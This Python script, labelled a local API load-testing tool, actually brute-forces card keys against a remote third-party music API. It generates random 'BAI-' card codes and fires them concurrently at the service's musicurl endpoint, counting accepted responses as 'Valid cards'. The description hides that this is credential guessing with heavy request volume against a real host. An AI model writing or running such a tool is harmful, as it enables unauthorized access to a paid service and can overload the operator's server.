from __future__ import annotations

import argparse
import random
import string
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass

import requests


DEFAULT_URL = "http://api.liuyunidc.cn/baimusic/musicurl.php"

DEFAULT_PARAMS = {
    "source": "kg",
    "musicId": "b3a52a7a958bf0aed0ebfba2e9a818b7",
    "quality": "128k",
}


@dataclass
class TestResult:
    success: int = 0
    failed: int = 0
    errors: int = 0
    valid: int = 0


class ProgressTracker:
    def __init__(self, total: int) -> None:
        self.total = total
        self.completed = 0
        self.success = 0
        self.failed = 0
        self.errors = 0
        self.valid = 0
        self.start_time = time.perf_counter()
        self.lock = threading.Lock()
        self.stop_event = threading.Event()

    def update(self, status: bool | None) -> None:
        with self.lock:
            self.completed += 1

            if status is True:
                self.success += 1
                self.valid += 1
            elif status is False:
                self.failed += 1
            else:
                self.errors += 1

    def snapshot(self) -> dict[str, float | int]:
        with self.lock:
            elapsed = time.perf_counter() - self.start_time
            rate = self.completed / elapsed if elapsed > 0 else 0
            percent = self.completed / self.total * 100 if self.total > 0 else 0
            remaining = self.total - self.completed
            eta = remaining / rate if rate > 0 else 0

            return {
                "completed": self.completed,
                "total": self.total,
                "percent": percent,
                "success": self.success,
                "failed": self.failed,
                "errors": self.errors,
                "valid": self.valid,
                "elapsed": elapsed,
                "rate": rate,
                "eta": eta,
            }

    def print_progress(self) -> None:
        while not self.stop_event.is_set():
            self._print_line()
            time.sleep(0.5)

        self._print_line()
        print()

    def _print_line(self) -> None:
        data = self.snapshot()

        line = (
            f"\rProgress: {data['percent']:6.2f}% "
            f"| {data['completed']}/{data['total']} "
            f"| RPS: {data['rate']:.2f} "
            f"| ETA: {data['eta']:.1f}s "
            f"| OK: {data['success']} "
            f"| Failed: {data['failed']} "
            f"| Errors: {data['errors']} "
            f"| Valid: {data['valid']}"
        )

        sys.stdout.write(line)
        sys.stdout.flush()


def generate_card() -> str:
    chars = string.ascii_uppercase + string.digits
    random_part = "".join(random.choices(chars, k=20))
    return f"BAI-{random_part}"


def send_request(
    session: requests.Session,
    url: str,
    timeout: float,
) -> bool | None:
    card_id = generate_card()
    params = {**DEFAULT_PARAMS, "card": card_id}

    try:
        response = session.get(url, params=params, timeout=timeout)

        if response.status_code != 200:
            return False

        try:
            data = response.json()
        except ValueError:
            return False

        return data.get("code") == 0

    except requests.RequestException:
        return None


def worker(
    url: str,
    request_count: int,
    timeout: float,
    progress: ProgressTracker,
) -> TestResult:
    result = TestResult()

    with requests.Session() as session:
        for _ in range(request_count):
            status = send_request(session, url, timeout)
            progress.update(status)

            if status is True:
                result.success += 1
                result.valid += 1
            elif status is False:
                result.failed += 1
            else:
                result.errors += 1

    return result


def run_test(
    url: str,
    total_requests: int,
    workers: int,
    timeout: float,
) -> TestResult:
    requests_per_worker = total_requests // workers
    extra_requests = total_requests % workers

    jobs = [
        requests_per_worker + (1 if index < extra_requests else 0)
        for index in range(workers)
    ]

    progress = ProgressTracker(total_requests)
    progress_thread = threading.Thread(target=progress.print_progress, daemon=True)
    progress_thread.start()

    final_result = TestResult()

    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [
            executor.submit(worker, url, job_count, timeout, progress)
            for job_count in jobs
            if job_count > 0
        ]

        for future in as_completed(futures):
            result = future.result()
            final_result.success += result.success
            final_result.failed += result.failed
            final_result.errors += result.errors
            final_result.valid += result.valid

    progress.stop_event.set()
    progress_thread.join()

    elapsed = time.perf_counter() - progress.start_time
    completed = final_result.success + final_result.failed + final_result.errors
    rps = completed / elapsed if elapsed > 0 else 0

    print("\nSummary")
    print("=" * 50)
    print(f"Target URL: {url}")
    print(f"Total requests: {completed}")
    print(f"Workers: {workers}")
    print(f"Elapsed time: {elapsed:.2f}s")
    print(f"Requests per second: {rps:.2f}")
    print(f"Success responses: {final_result.success}")
    print(f"Failed responses: {final_result.failed}")
    print(f"Request errors: {final_result.errors}")
    print(f"Valid cards: {final_result.valid}")

    return final_result


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Local API load testing tool.")

    parser.add_argument(
        "--url",
        default=DEFAULT_URL,
        help="Local target URL.",
    )

    parser.add_argument(
        "--requests",
        type=int,
        default=1000,
        help="Total number of requests.",
    )

    parser.add_argument(
        "--workers",
        type=int,
        default=20,
        help="Number of concurrent workers.",
    )

    parser.add_argument(
        "--timeout",
        type=float,
        default=3.0,
        help="Request timeout in seconds.",
    )

    return parser.parse_args()


def main() -> None:
    args = parse_args()

    if args.requests <= 0:
        raise ValueError("Total requests must be greater than 0.")

    if args.workers <= 0:
        raise ValueError("Workers must be greater than 0.")

    if args.workers > args.requests:
        args.workers = args.requests

    run_test(
        url=args.url,
        total_requests=args.requests,
        workers=args.workers,
        timeout=args.timeout,
    )


if __name__ == "__main__":
    main()